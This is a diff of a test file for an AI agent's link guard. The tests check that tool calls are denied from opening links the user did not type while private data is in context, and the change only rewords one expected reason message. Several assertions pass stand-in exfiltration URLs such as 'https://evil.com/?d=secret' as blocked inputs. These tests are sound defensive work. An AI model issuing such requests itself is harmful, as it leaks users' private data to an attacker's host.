@@ -62,7 +62,7 @@ test("link guard: with files/pins/private data in context, only links the user t
     assert.equal(ok("reach_read", { url: "https://evil.com/?d=secret" }, c), false);
     assert.equal(ok("fetch_url", { url: "https://evil.com/?d=secret" }, c), false);
   }
-  assert.match(decide("fetch_url", { url: "https://evil.com" }, ctx({ attach: true })).reason, /only links the user typed/);
+  assert.match(decide("fetch_url", { url: "https://evil.com" }, ctx({ attach: true })).reason, /only open links the user typed/);
   assert.equal(ok("read_news", { query: "see evil.com/x" }, ctx({ attach: true })), false); // domain/path token
   assert.equal(ok("ask_agent", { agent: "atlas", request: "go to https://evil.com" }, ctx({ attach: true })), false);
   // no files in context → links are free
